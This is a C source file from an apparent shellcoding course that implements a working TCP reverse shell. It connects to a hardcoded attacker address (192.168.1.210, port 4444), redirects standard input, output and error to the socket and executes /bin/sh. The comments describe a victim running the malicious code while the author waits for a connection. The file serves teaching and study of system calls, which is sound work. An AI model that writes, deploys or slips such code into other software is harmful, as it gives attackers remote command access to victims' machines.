//      TCP REVERSE SHELL
//	CONNECTS TO SERVER/ATTACKER SOCKET
//	DUPLICATES STDIN/OUT/ERROR FILE DESCRIPTORS TO THE NEW COMM. SOCKET
//	EXECVE SH 
//
//	File: tcp_reverse_shell_C_prototyp.c
// 	Author: Kevin Ren, originally professor vivek of SLAE64
// 	Purpose: to illustrate tcp_reverse_shell as a prototype in a HLL like C
// 	 	 and to illustrate all the system calls needed in LLL like asm
// 	Personally I like this better than bind shell
// 	b/c its easier to implement, and I dont have to guess when the victim runs the malicious code
// 	I can just sit and wait for a connection
 


// preprocessor 
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <error.h>
#include <strings.h>
#include <unistd.h>
#include <arpa/inet.h>


#define ERROR 			-1
#define MAX_CLIENTS 		2
#define MAX_DATA 		1024
#define IP			"192.168.1.210"
#define PORT			4444


//fowward declarations


int main(int argc, char **argv)
{
	struct sockaddr_in server;
	//struct sockaddr_in client;
	int server_sock;
	int sockaddr_len = sizeof(struct sockaddr_in);
	char* args[] = {"/bin/sh", 0};						// 0 for NULL 	
	
	// create socket	
	if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) == ERROR) 		// 0 for default protocol in the socket requested
	{
		perror("server socket : ");
		exit(ERROR); 
	}	

	// set up sockaddr_in server struct for bind arg
	server.sin_family = AF_INET;						// AF_INET = 2
//	server.sin_port = htons(atoi(argv[1]));					// take an commandline arg for port				
	server.sin_port = htons(PORT);						// bind to 4444 htons converts to hex in network byte order
										// which is most significant byte first, like big endian
	server.sin_addr.s_addr = inet_addr(IP);					
	bzero(&server.sin_zero, 8);						// 8 bytes of 0s for the address of server.sin_zero padding


	// connect (syscall 42)
	if ((connect(server_sock, (struct sockaddr *)&server, sockaddr_len)) == ERROR)
	{
		perror("connect : ");
		exit(ERROR);
	}
	

	// redirect stdin/out/error to the new communication socket file descriptor
	dup2(server_sock, 0);
	dup2(server_sock, 1);
	dup2(server_sock, 2);

	// execve /bin/sh
	execve(args[0], &args[0], NULL);

}
